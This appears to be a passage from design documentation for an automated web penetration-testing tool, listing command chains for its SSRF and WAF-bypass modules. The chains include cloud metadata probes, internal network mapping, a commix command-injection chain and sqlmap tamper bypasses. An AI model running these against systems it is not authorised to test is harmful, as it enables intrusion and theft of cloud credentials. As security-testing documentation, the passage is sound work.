    - **Multi-Tool Command Logic**:
        1. `ffuf -u <url>?url=http://FUZZ -w <internal_cidr_list> -mc 200,403` (Internal Mapping)
        2. `httpx -u <url>?url=http://169.254.169.254 -status-code` (Cloud Metadata Probe)
        3. `nuclei -u <url> -t ssrf/ssrf-oob.yaml` (Out-of-band Verification)
        4. `curl -X POST <url> -d "target=http://internal-api.local"` (Post-based SSRF Test)
        5. `commix -u <url> --os-cmd="curl http://127.0.0.1"` (RCE-to-SSRF Chain)
    - **Execution Flow**: Internal Mapping -> Metadata Probe -> OOB Verification -> Post-SSRF Test -> RCE Chain.
    - **Output Generation & Artifacts**:
        - `reports/outputs/MAP_[Timestamp]_internal_network.json`: Map of internal hosts and services discovered via SSRF.
        - `reports/artifacts/MAP_[Timestamp]_cloud_metadata.json`: Extracted cloud instance metadata (AWS/Azure/GCP).
        - `reports/analysis/MAP_[Timestamp]_oob_hit.txt`: Confirmation of out-of-band SSRF callback.

---

### 12. WAF Bypass
**ID:** `webapp-waf` | **Risk:** MEDIUM | **File:** `WAFBypassModule.java`
**Tools:** `nuclei`, `ffuf`, `httpx`, `curl`, `sqlmap`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify WAF/IPS/IDS presence and fingerprint.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `nuclei -u <url> -t waf-detect/ -json` (Core WAF Scan)
        2. `httpx -u <url> -status-code -tech-detect` (Asset Identity)
        3. `curl -v -k <url> -H "X-WAF-Probe: <script>"` (Trigger Probe)
        4. `ffuf -u <url>/FUZZ -w waf_signatures.txt -mc 403,406` (Signature Discovery)
        5. `sqlmap -u <url> --batch --identify-waf` (SQLMap WAF Audit)
    - **Execution Flow**: Core Scan -> Asset Identity -> Trigger Probe -> Signature Discovery -> SQLMap Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_waf_identity.json`: Identification and fingerprint of active WAF/IPS.
        - `reports/artifacts/SCAN_[Timestamp]_trigger_probe.txt`: Log of WAF rule triggering and response behaviors.
        - `reports/analysis/SCAN_[Timestamp]_signature_map.json`: Map of identified WAF signatures and bypass potential.

- **`TEST`** (Short Name: `TEST`)
    - **Purpose**: Validate WAF bypass techniques and rule effectiveness.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -H "X-Forwarded-For: 127.0.0.1" <url>` (Header Bypass Test)
        2. `ffuf -u <url>/FUZZ -w encoding_payloads.txt -mc 200` (Encoding Bypass Test)
        3. `nuclei -u <url> -t bypasses/waf/ -json` (Template Bypass Audit)
        4. `httpx -u <url> -header-check` (WAF Leakage Audit)
        5. `sqlmap -u <url> --batch --tamper=space2comment` (Tamper Script Test)
    - **Execution Flow**: Header Bypass -> Encoding Bypass -> Template Audit -> Leakage Audit -> Tamper Test.
    - **Output Generation & Artifacts**:
        - `reports/outputs/TEST_[Timestamp]_waf_bypasses.json`: Results of successful WAF rule bypass techniques.
        - `reports/artifacts/TEST_[Timestamp]_tamper_results.txt`: Technical results of SQLMap tamper script tests.
        - `reports/analysis/TEST_[Timestamp]_bypass_readiness.json`: Assessment of the WAF's effectiveness against common attacks.

---
